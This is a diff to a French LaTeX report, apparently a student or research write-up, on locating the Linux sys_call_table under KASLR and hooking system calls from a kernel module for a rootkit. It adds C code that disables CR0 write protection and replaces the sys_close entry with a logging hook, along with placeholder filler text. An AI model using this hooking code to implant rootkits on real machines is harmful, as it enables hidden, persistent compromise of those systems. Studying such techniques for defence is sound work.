@@ -3,6 +3,7 @@
 
 \usepackage{xcolor}
 \usepackage{listings}
+\usepackage{hyperref}
 
 \definecolor{mGreen}{rgb}{0,0.6,0}
 \definecolor{mGray}{rgb}{0.5,0.5,0.5}
@@ -41,6 +42,8 @@
 Lorem ipsum dolor sit amet, consectetur adipiscing elit, sed do eiusmod tempor incididunt ut labore et dolore magna aliqua. Ut enim ad minim veniam, quis nostrud exercitation ullamco laboris nisi ut aliquip ex ea commodo consequat. Duis aute irure dolor in reprehenderit in voluptate velit esse cillum dolore eu fugiat nulla pariatur. Excepteur sint occaecat cupidatat non proident, sunt in culpa qui officia deserunt mollit anim id est laborum.
 
 Lorem ipsum dolor sit amet, consectetur adipiscing elit, sed do eiusmod tempor incididunt ut labore et dolore magna aliqua. Ut enim ad minim veniam, quis nostrud exercitation ullamco laboris nisi ut aliquip ex ea commodo consequat. Duis aute irure dolor in reprehenderit in voluptate velit esse cillum dolore eu fugiat nulla pariatur. Excepteur sint occaecat cupidatat non proident, sunt in culpa qui officia deserunt mollit anim id est laborum.
+
+Blablabla Avant 4.17 telle façon, blablabla, marche plus, blablabla, nouvelle manière sur noyau récent, blablabla, différence avec ancienne, blablabla
 
 \section{Notions et état de l'art}
 
@@ -82,7 +85,7 @@ else
 \begin{lstlisting}[style=CStyle]
 wrmsrl(MSR_LSTAR, (unsigned long)entry_SYSCALL_64);
 \end{lstlisting}
-Dans les version 4.17 à 4.19 la routine commence à \textit{SYSCALL64\_entry\_trampoline} (\textit{X86\_FEATURE\_PTI} représente la KASLR). Il n'est pas possible de tomber directement dans \textit{entry\_SYSCALL\_64} avec un \textit{jmp}. Un \textit{jmp} utilise une adresse relative limitée à 32 bits, insufisante pour atteindre la fonction désirée. On a donc une fonction qui sert de "trampoline" pour finalement retomber dans \textit{entry\_SYSCALL\_64}. En 4.20 il n'y a plus ce problème et l'on tombe directement dans \textit{entry\_SYSCALL\_64}. On continue de suivre la routine :
+Dans les version 4.17 à 4.19 la routine commence à \textit{SYSCALL64\_entry\_trampoline} (\textit{X86\_FEATURE\_PTI} est une sécurité contre la faille Meltdown, Page Table Isolation). Il n'est pas possible de tomber directement dans \textit{entry\_SYSCALL\_64} avec un \textit{jmp}. Un \textit{jmp} utilise une adresse relative limitée à 32 bits, insufisante pour atteindre la fonction désirée. On a donc une fonction qui sert de "trampoline" pour finalement retomber dans \textit{entry\_SYSCALL\_64}. En 4.20 il n'y a plus ce problème et l'on tombe directement dans \textit{entry\_SYSCALL\_64}. On continue de suivre la routine :
 \\
 \\
 /arch/x86/entry/entry\_64.S (4.17 - 4.20) :
@@ -268,27 +271,90 @@ Les patterns qui précèdent ce \textit{mov} sont les suivants :
 21 d0                 and %edx, %eax  
 48 89 ef              mov %rbp, %rdi  
 \end{lstlisting}
-On a donc une attaque qui permet de retrouver l'adresse de la \textit{sys\_call\_table} et de \textit{ia32\_sys\_call\_table} avec la KASLR activée. Elle a été testée avec succès sur les versions 4.17 à 4.20 ainsi que 5.0-rc3. Rien n'indique qu'elle ne pourrait pas fonctionner sur d'autres versions. Les seuls étapes susceptibles de changer sont le point d'accroche à la fonction \textit{entry\_SYSCALL\_64} et les patterns pour retrouver les \textit{call} et \textit{mov}. 
+On a donc une attaque qui permet de retrouver l'adresse de la \textit{sys\_call\_table} et de \textit{ia32\_sys\_call\_table} avec la KASLR activée. Elle a été testée avec succès sur les versions 4.17 à 4.20 ainsi que 5.0-rc3. Rien n'indique qu'elle ne pourrait pas fonctionner sur d'autres versions. Les seuls étapes susceptibles de changer sont le point d'accroche à la fonction \textit{entry\_SYSCALL\_64} et les patterns pour retrouver les \textit{call} et \textit{mov}.
+
+\section{Code}
+
+Nous utiliserons un LKM (Linux Kernel Module) pour faire notre rootkit. Ceci implique qu'un attaquant devra nécessairement avoir un accès \textit{root} à la machine pour y installer le rootkit.  Nous ne verrons pas en détails la fonction qui retrouve l'adresse de la \textit{sys\_call\_table} car la section précédente est assez claire à ce sujet. Néanmoins nous allons apporter quelques précisions sur comment "hook" les appels systèmes.
+
+La première difficulté est que la page mémoire contenant la \textit{sys\_call\_table} est en \textit{READ-ONLY}. Il est donc nécessaire de modifier temporairement le registre \textit{CR0}. C'est un registre de contrôle sur 32 bits qui régit le comportement du processeur. La partie qui nous intéresse est la protection d'écriture codée sur le 16 ème bits. Elle permet ou non au processeur d'écrire sur une page mémoire en \textit{READ-ONLY} :
+\begin{lstlisting}[style=CStyle]
+static void hook_syscall(void) {
+  if (!sys_call_table) {
+    printk(KERN_INFO "failed to hook syscall64, sys_call_table address is missing");
+    return;
+  }
+  
+  write_cr0(read_cr0() & ~0x10000);
+  real_close = sys_call_table[__NR_close];
+  sys_call_table[__NR_close] = fake_close;
+  write_cr0(read_cr0() | 0x10000);
+}
+
+static void unhook_syscall(void) {
+  if (!sys_call_table) {
+    printk(KERN_INFO "failed to reset syscall, sys_call_table address is missing");
+    return;
+  }
+  
+  write_cr0(read_cr0() & ~0x10000);
+  sys_call_table[__NR_close] = real_close;
+  write_cr0(read_cr0() | 0x10000);
+}
+\end{lstlisting}
+Le deuxième obstacle est au niveau de la déclaration des appels système. D'après le header (linux/syscalls.h) du noyau, la fonction qui représente l'appel système \textit{sys\_close()} est de la forme :
+\begin{lstlisting}[style=CStyle]
+asmlinkage long sys_close(unsigned int fd);
+\end{lstlisting}
+On pourrait croire qu'il suffit de reprendre la même syntaxe pour notre pointeur de fonction. Le problème est que cela amène à un "kernel panic". Pour comprendre il faut regarder l'appel à la \textit{sys\_call\_table} dans la fonction \textit{do\_syscall\_64} :
+\begin{lstlisting}[style=CStyle]
+/* Avant le correctif */
+regs->ax = sys_call_table[nr](
+			regs->di, regs->si, regs->dx,
+			regs->r10, regs->r8, regs->r9);
+
+/* Apres le correctif */
+regs->ax = sys_call_table[nr](regs);
+\end{lstlisting}
+Avant le correctif, la fonction \textit{do\_syscall\_64} préparait elle-même les arguments de l'appel système à partir des registres. Après le correctif ceci est fait plus tard. Il est juste nécessaire de donner la structure \textit{pt\_regs} qui est un pointeur vers les registres :
+\begin{lstlisting}[style=CStyle]
+asmlinkage long (*real_close)(struct pt_regs *);
+
+asmlinkage long fake_close(struct pt_regs *regs) {
+  printk(KERN_INFO "sys_close hooked");
+  return (*real_close)(regs);
+}
+\end{lstlisting}
+
+\newpage
 \begin{thebibliography}{}
+	\bibitem{1}
+	\href{https://0xax.gitbooks.io/linux-insides/content/SysCall/}{System calls in the Linux kernel}\\
+	0xax.gitbooks.io\\
+
 	\bibitem{3}
-	Linux kernel patch 4.17\\
-	\url{https://github.com/torvalds/linux/commit/2ca2a09d6215fd9621aa3e2db7cc9428a61f2911#diff-acc7893dfa77092a11e1b53e98a34d44}
+	\href{https://github.com/torvalds/linux/commit/2ca2a09d6215fd9621aa3e2db7cc9428a61f2911#diff-acc7893dfa77092a11e1b53e98a34d44}{Linux kernel patch 4.17}\\
+	github.com/torvalds/linux\\
+
+	\bibitem{3}
+	\href{https://github.com/torvalds/linux/blob/master/arch/x86/kernel/cpu/common.c}{syscall\_init()}\\
+	github.com/torvalds/linux\\
+
+	\bibitem{3}
+	\href{https://github.com/torvalds/linux/commit/bf904d2762ee6fc1e4acfcb0772bbfb4a27ad8a6#diff-ebc0521fec74b465090151aabc564493}{SYSCALL\_entry\_trampoline}\\
+	github.com/torvalds/linux\\
 
 	\bibitem{1}
-	System calls in the Linux kernel\\
-	\url{https://0xax.gitbooks.io/linux-insides/content/SysCall/}
-
-	\bibitem{1}
-	Linux kernel\\
-	\url{https://github.com/torvalds/linux/blob/master/arch/x86/entry/entry_64.S}
+	\href{https://github.com/torvalds/linux/blob/master/arch/x86/entry/entry_64.S}{entry\_SYSCALL\_64}\\
+	github.com/torvalds/linux\\
 
 	\bibitem{2}
-	Linux kernel\\
-	\url{https://github.com/torvalds/linux/blob/master/arch/x86/entry/common.c}
+	\href{https://github.com/torvalds/linux/blob/master/arch/x86/entry/common.c}{do\_syscall\_64}\\
+	github.com/torvalds/linux\\
 
 	\bibitem{3}
-	Linux kernel\\
-	\url{https://github.com/torvalds/linux/blob/master/arch/x86/kernel/cpu/common.c}
+	\href{https://github.com/torvalds/linux/commit/f8781c4a226319fe60e652118b90cf094ccfe747#diff-4655f345e095506d5fd4c2af0c209d5e}{syscall wrapper}\\
+	github.com/torvalds/linux\\
 \end{thebibliography}
 
 \end{document}
